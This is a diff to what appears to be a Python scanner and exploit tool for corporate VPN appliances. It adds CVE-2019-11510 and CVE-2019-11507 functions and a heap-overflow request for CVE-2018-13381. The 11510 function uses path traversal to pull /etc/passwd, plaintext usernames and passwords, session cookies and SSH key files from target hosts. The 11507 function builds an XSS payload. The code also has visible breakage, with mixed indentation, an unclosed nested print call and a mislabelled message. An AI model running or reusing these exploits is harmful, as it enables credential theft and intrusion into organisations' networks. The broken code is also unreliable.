@@ -9,7 +9,7 @@ requests.packages.urllib3.disable_warnings()
 
 
 cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381'
-	  'CVE-2018-13379']
+	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510']
 # Updating this list ...
 vpnsub = ['vpn', 'covpn', 'tcovpn',
           'panvpn', 'vpn-blr', 'vpn-blr1',
@@ -176,13 +176,58 @@ def cve_2018_13379(host, port):
 
 	
 def cve_2018_13381(host, port):
-	data = {
-	       'title': 'x', 
-               'msg': '&#' + '<'*(0x20000) + ';<', 
-        }
-	r = requests.post('https://%s%s/message' % (host, port), data=data)
-	print('Heaped overflow the host %s' % host)
-
+    data = {
+	   'title': 'x', 
+           'msg': '&#' + '<'*(0x20000) + ';<', 
+    }
+    r = requests.post('https://%s%s/message' % (host, port), data=data)
+    print('Heaped overflow the host %s' % host)
+	
+	
+	
+def cve_2019_11507(host, port):
+    url = 'https://%s%s/dana/home/cts_get_ica.cgi?bm_id=x&vdi=1&appname=aa\%0d\%0aContent-Type::text/html\%0d\%0aContent-Disposition::inline\%0d\%0aaa:bb<svg/onload=alert(document.domain)>' % (host, port)
+    print('Got the XSS payload for %s:' % host)
+    print(' - %s' % red + url)
+	
+	
+	
+def cve_2019_11510(host, port):
+    url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/' % (host, port)
+    r = requests.get(url, verify=False).text
+	
+    if 'root' in r:
+	print('Extracted the server database from %s' % host)
+	print('')
+	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' % (host, port)
+	r = requests.get(url, verify=False).text
+	if len(r) > 5:
+	    print('Plaintext usernames and password:')
+	    for l in r.split('\n'):
+		print(' - ' + l)
+	else:
+	    print('Plaintext usernames and password: Not found')
+	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/' % (host, port)
+	r = requests.get(url, verify=False).text.replace('\n', '')
+	print('Session cookies (sessionids): DSID=%s' % r)
+	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../.ssh/authorized_keys?/dana/html5acc/guacamole/' % (host, port)
+        ssh = requests.get(url, verify=False).text
+	if len(ssh) > 50:
+	    print('  SSH PRIVATE RSA KEYS')
+    	    print('')
+    	    print(' - - - - - - - - - - - - - - - ')
+	    print(ssh)
+	    print(' - - - - - - - - - - - - - - - ')
+	else:
+	    print(print('  SSH PRIVATE RSA KEYS')
+    	    print('')
+    	    print(' - - - - - - - - - - - - - - - ')
+            print(' Not found')
+            print(' - - - - - - - - - - - - - - - ')
+	
+    else:
+	print('The host %s is not vulnerable to CVE-2018-13379' % host)
+	
 	
 	
 def scan(host):
